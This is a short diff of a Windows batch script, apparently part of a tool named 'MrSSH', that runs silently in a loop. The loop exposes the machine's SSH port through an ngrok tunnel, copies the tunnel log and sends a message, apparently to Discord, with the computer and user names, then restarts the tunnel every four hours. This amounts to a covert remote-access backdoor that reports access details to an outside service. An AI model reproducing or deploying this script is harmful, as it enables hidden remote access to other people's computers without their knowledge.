@@ -68,7 +68,7 @@ start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngro
 
 :: <Restart Loop>
 :ngrokloop
-call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
+call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%query%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
 start /B "copy" silentcmd xcopy /h /Y ngrok.log !Folder!\log\ /DELAY:10
 start /B "discordmsg" silentcmd !Folder!\NgrokRun.bat /DELAY:10
 start /B "timeout" timeout 14400 & taskkill /IM ngrok.exe /F
